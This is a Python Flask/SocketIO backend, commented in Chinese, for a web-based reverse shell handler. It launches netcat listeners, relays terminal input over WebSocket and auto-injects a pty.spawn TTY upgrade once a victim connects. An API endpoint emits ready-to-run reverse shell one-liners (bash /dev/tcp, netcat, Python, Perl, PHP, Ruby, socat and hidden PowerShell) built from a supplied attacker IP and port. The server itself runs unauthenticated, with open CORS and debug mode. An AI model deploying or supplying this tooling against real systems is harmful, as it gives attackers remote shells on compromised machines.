"""
Web-based Reverse Shell Handler - Backend
纯 Python + Flask + Flask-SocketIO 实现，无任何第三方中间件。
所有进程管理和会话状态均在单节点内存中轻量级处理。
"""

import os
import select
import subprocess
import threading
import time
import re
from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit

app = Flask(__name__)
app.config['SECRET_KEY'] = 'ncs-secret-2077'

# 使用 threading 模式，无需 gevent/eventlet
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# ─────────────────────────────────────────────
# 全局状态管理（单节点内存，无中间件）
# ─────────────────────────────────────────────
# { port(int): subprocess.Popen }
listeners = {}
# { port(int): threading.Thread }
reader_threads = {}
# { port(int): { 'auto_tty': bool } }  — 元数据，用于 /api/status 返回
listener_meta = {}

# AUTO TTY UPGRADE 命令序列
# 注意：nc 作为 subprocess 运行时，Ctrl+Z / stty raw -echo / fg 模式不适用。
# 那套流程是为"用户在自己的终端里手动操作 nc"设计的。
# 在 Web 架构中，nc 的 stdin/stdout 是 PIPE 而非 TTY，
# Ctrl+Z 会被发送到远端 shell（而非本地），stty raw -echo 作用于 PIPE 无效且有害。
#
# 正确做法：
#   1. python3 pty.spawn → 在远端创建伪终端（自带 echo）
#   2. export TERM → 启用颜色和光标控制
#   3. stty sane → 确保远端 PTY 行规程正常（\n → \r\n 转换、echo 开启）
#   4. stty rows/cols → 与前端 xterm.js 实际尺寸同步
#
# {rows} 和 {cols} 会在运行时由前端传入的实际尺寸替换。
TTY_UPGRADE_SEQUENCE_TEMPLATE = [
    ("cmd",   "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n"),
    ("cmd",   "export TERM=xterm-256color\n"),
    ("cmd",   "stty sane\n"),
    ("cmd",   "stty rows {rows} cols {cols}\n"),
]


# ─────────────────────────────────────────────
# 内部工具函数
# ─────────────────────────────────────────────

def _push(port: int, data: str):
    """向所有已连接的 WebSocket 客户端广播终端输出。"""
    socketio.emit('terminal_output', {'port': port, 'data': data})


def _execute_tty_upgrade(port: int, process: subprocess.Popen, rows: int = 24, cols: int = 80):
    """
    在独立线程中按序注入 TTY 升级命令。

    关键设计：
    - 不使用 Ctrl+Z / stty raw -echo / fg，因为 nc 是 subprocess（PIPE）而非真实 TTY。
    - python3 pty.spawn 在远端创建伪终端，自带 echo 和 \n→\r\n 转换。
    - stty sane 确保行规程正常。
    - stty rows/cols 与前端 xterm.js 实际尺寸同步。
    """
    _push(port, '\r\n\x1b[33m[*] AUTO TTY UPGRADE triggered — injecting sequence...\x1b[0m\r\n')

    sequence = [
        (stype, cmd.format(rows=rows, cols=cols))
        for stype, cmd in TTY_UPGRADE_SEQUENCE_TEMPLATE
    ]

    for step_type, cmd in sequence:
        try:
            process.stdin.write(cmd.encode('utf-8'))
            process.stdin.flush()
            # pty.spawn 需要更长的等待时间让远端 bash 完全启动
            if 'pty.spawn' in cmd:
                time.sleep(1.5)
            else:
                time.sleep(0.5)
        except OSError as e:
            _push(port, f'\r\n\x1b[31m[!] TTY upgrade step failed: {e}\x1b[0m\r\n')
            return

    _push(port, '\r\n\x1b[32m[+] AUTO TTY UPGRADE sequence completed.\x1b[0m\r\n')


def _read_output(port: int, process: subprocess.Popen, auto_tty: bool):
    """
    非阻塞读取子进程 stdout/stderr，并通过 WebSocket 实时推送。

    实现要点：
    - 使用 select.select() 以 0.1s 超时轮询文件描述符，避免阻塞。
    - os.read() 直接读取原始字节，支持任意二进制数据（包括 ANSI 转义序列）。
    - 连接建立检测：正则匹配 "Connection received" 等特征，触发 TTY 升级。
    """
    fd = process.stdout.fileno()
    tty_triggered = False

    while True:
        # 进程已退出则退出读取循环
        if process.poll() is not None:
            _push(port, f'\r\n\x1b[33m[*] Process on port {port} has exited.\x1b[0m\r\n')
            # 清理全局状态
            listeners.pop(port, None)
            reader_threads.pop(port, None)
            listener_meta.pop(port, None)
            # 通知前端更新监听器状态
            socketio.emit('listener_stopped', {'port': port})
            break

        # select 非阻塞等待，超时 0.1s
        try:
            r, _, _ = select.select([fd], [], [], 0.1)
        except (ValueError, OSError):
            break

        if fd not in r:
            continue

        try:
            data = os.read(fd, 4096)
        except OSError:
            break

        if not data:
            break

        text = data.decode('utf-8', errors='replace')
        _push(port, text)

        # AUTO TTY UPGRADE 状态机：仅触发一次
        # 仅匹配远端真正建立连接的特征，排除 nc 自身启动时的 "Listening" 输出
        # nc -lvnp 启动时会输出 "Listening on ..."，不能作为连接建立的依据
        if auto_tty and not tty_triggered:
            if re.search(
                r'(Connection received|connect to\s+\[)',
                text, re.IGNORECASE
            ):
                tty_triggered = True
                # 从 listener_meta 获取前端传入的终端尺寸
                meta = listener_meta.get(port, {})
                t_rows = meta.get('rows', 24)
                t_cols = meta.get('cols', 80)
                # 等待 0.5s 让连接稳定，再注入升级序列
                def _delayed_upgrade(p, proc, r, c):
                    time.sleep(0.5)
                    _execute_tty_upgrade(p, proc, rows=r, cols=c)
                t = threading.Thread(
                    target=_delayed_upgrade,
                    args=(port, process, t_rows, t_cols),
                    daemon=True
                )
                t.start()


# ─────────────────────────────────────────────
# HTTP 路由
# ─────────────────────────────────────────────

@app.route('/')
def index():
    """前端单页面入口。"""
    return render_template('index.html')


@app.route('/api/listeners', methods=['GET'])
def get_listeners():
    """获取所有当前活跃监听器列表。"""
    active = []
    for port, proc in list(listeners.items()):
        if proc.poll() is None:
            active.append({'port': port, 'status': 'running'})
        else:
            listeners.pop(port, None)
    return jsonify({'status': 'success', 'data': active})


@app.route('/api/listeners/start', methods=['POST'])
def start_listener():
    """
    启动一个新的 nc 监听器进程。
    请求体: { "port": 4444, "auto_tty": true }
    """
    data = request.get_json(force=True) or {}
    port_raw = data.get('port')
    auto_tty = bool(data.get('auto_tty', False))
    term_rows = int(data.get('rows', 24))
    term_cols = int(data.get('cols', 80))

    if not port_raw:
        return jsonify({'status': 'error', 'message': 'Port is required'}), 400
    try:
        port = int(port_raw)
        assert 1 <= port <= 65535
    except (ValueError, AssertionError):
        return jsonify({'status': 'error', 'message': 'Invalid port number'}), 400

    if port in listeners and listeners[port].poll() is None:
        return jsonify({'status': 'error', 'message': f'Port {port} is already listening'}), 409

    try:
        # stdbuf -i0 -o0 -e0 禁用 stdio 缓冲，确保输出实时性
        cmd = ['stdbuf', '-i0', '-o0', '-e0', 'nc', '-lvnp', str(port)]
        process = subprocess.Popen(
            cmd,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            bufsize=0,
            close_fds=True,
        )
    except FileNotFoundError:
        return jsonify({'status': 'error', 'message': 'nc (netcat) not found on this system'}), 500
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

    listeners[port] = process
    listener_meta[port] = {'auto_tty': auto_tty, 'rows': term_rows, 'cols': term_cols}

    t = threading.Thread(
        target=_read_output,
        args=(port, process, auto_tty),
        daemon=True
    )
    t.start()
    reader_threads[port] = t

    return jsonify({'status': 'success', 'message': f'Listener started on port {port}', 'port': port})


@app.route('/api/listeners/stop', methods=['POST'])
def stop_listener():
    """
    停止指定端口的监听器进程。
    请求体: { "port": 4444 }
    """
    data = request.get_json(force=True) or {}
    try:
        port = int(data.get('port', 0))
    except (ValueError, TypeError):
        return jsonify({'status': 'error', 'message': 'Invalid port'}), 400

    proc = listeners.get(port)
    if not proc or proc.poll() is not None:
        listeners.pop(port, None)
        return jsonify({'status': 'error', 'message': f'No active listener on port {port}'}), 404

    try:
        proc.terminate()
        proc.wait(timeout=3)
    except subprocess.TimeoutExpired:
        proc.kill()
    except Exception:
        pass

    listeners.pop(port, None)
    reader_threads.pop(port, None)
    listener_meta.pop(port, None)
    return jsonify({'status': 'success', 'message': f'Listener on port {port} stopped'})


@app.route('/api/status', methods=['GET'])
def get_status():
    """
    返回后端全局状态快照。
    前端刷新后调用此接口重新同步 UI。
    返回示例: {
      "status": "success",
      "listeners": [
        {"port": 4444, "running": true, "auto_tty": true}
      ]
    }
    """
    result = []
    for port, proc in list(listeners.items()):
        running = proc.poll() is None
        if not running:
            listeners.pop(port, None)
            reader_threads.pop(port, None)
            continue
        result.append({
            'port': port,
            'running': True,
            'auto_tty': listener_meta.get(port, {}).get('auto_tty', False),
        })
    return jsonify({'status': 'success', 'listeners': result})


@app.route('/api/payloads', methods=['GET'])
def get_payloads():
    """
    返回各类反弹 Shell Payload 字符串。
    Query 参数: ip=<LHOST>&port=<LPORT>
    """
    ip = request.args.get('ip', '0.0.0.0')
    port = request.args.get('port', '4444')

    payloads = {
        'BASH': {
            'title': 'BASH REVERSE SHELL',
            'codes': [
                f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
                f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'",
            ]
        },
        'BASH /DEV/TCP': {
            'title': 'BASH /DEV/TCP REVERSE SHELL',
            'codes': [
                f"exec 5<>/dev/tcp/{ip}/{port}; cat <&5 | while read line; do $line 2>&5 >&5; done",
            ]
        },
        'NC': {
            'title': 'NETCAT REVERSE SHELL',
            'codes': [
                f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
                f"nc -e /bin/sh {ip} {port}",
            ]
        },
        'PYTHON': {
            'title': 'PYTHON REVERSE SHELL',
            'codes': [
                f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            ]
        },
        'PYTHON3': {
            'title': 'PYTHON3 REVERSE SHELL',
            'codes': [
                f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'",
            ]
        },
        'PERL': {
            'title': 'PERL REVERSE SHELL',
            'codes': [
                f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            ]
        },
        'PHP': {
            'title': 'PHP REVERSE SHELL',
            'codes': [
                f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            ]
        },
        'RUBY': {
            'title': 'RUBY REVERSE SHELL',
            'codes': [
                f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            ]
        },
        'SOCAT': {
            'title': 'SOCAT REVERSE SHELL',
            'codes': [
                f"socat TCP:{ip}:{port} EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane",
            ]
        },
        'PWSH': {
            'title': 'POWERSHELL REVERSE SHELL',
            'codes': [
                f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command $client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
            ]
        },
    }

    return jsonify({'status': 'success', 'data': payloads})


# ─────────────────────────────────────────────
# WebSocket 事件
# ─────────────────────────────────────────────

@socketio.on('connect')
def handle_connect():
    print(f'[WS] Client connected: {request.sid}')


@socketio.on('disconnect')
def handle_disconnect():
    print(f'[WS] Client disconnected: {request.sid}')


@socketio.on('terminal_input')
def handle_terminal_input(data):
    """
    接收前端 xterm.js 的键盘输入，写入对应 nc 进程的 stdin。
    前端绝对不做本地回显，完全依赖后端 terminal_output 事件。

    参数: { "port": 4444, "data": "<raw keystrokes string>" }
    """
    try:
        port = int(data.get('port', 0))
        raw = data.get('data', '')
    except (TypeError, ValueError):
        return

    if not raw:
        return

    proc = listeners.get(port)
    if not proc or proc.poll() is not None:
        emit('terminal_output', {
            'port': port,
            'data': '\r\n\x1b[31m[!] No active listener on this port.\x1b[0m\r\n'
        })
        return

    try:
        proc.stdin.write(raw.encode('utf-8'))
        proc.stdin.flush()
    except OSError as e:
        emit('terminal_output', {
            'port': port,
            'data': f'\r\n\x1b[31m[!] Write error: {e}\x1b[0m\r\n'
        })


# ─────────────────────────────────────────────
# 入口
# ─────────────────────────────────────────────

if __name__ == '__main__':
    socketio.run(
        app,
        host='0.0.0.0',
        port=5000,
        debug=True,
        allow_unsafe_werkzeug=True
    )
